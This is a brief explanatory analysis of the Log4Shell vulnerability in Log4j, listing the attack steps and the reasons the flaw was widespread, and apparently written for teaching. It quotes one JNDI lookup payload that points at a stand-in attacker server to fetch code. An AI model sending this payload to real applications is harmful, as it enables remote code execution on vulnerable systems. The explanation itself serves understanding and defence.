# Attack Analysis

The Log4Shell vulnerability allowed attackers to execute arbitrary code by injecting specially crafted strings into application logs.

Example malicious payload:

${jndi:ldap://attacker-server/payload}

When the application logged this string, Log4j performed a JNDI lookup and retrieved code from the attacker-controlled server.

The vulnerable system would then execute the malicious payload.

## Attack Steps

1. Attacker sends malicious input to the application
2. Application logs the input using Log4j
3. Log4j processes the JNDI lookup
4. Application retrieves malicious code from attacker server
5. Code executes within the application environment

## Why This Was Dangerous

- logging occurs in many parts of applications
- malicious payloads could be hidden in headers or parameters
- many systems indirectly used Log4j through dependencies
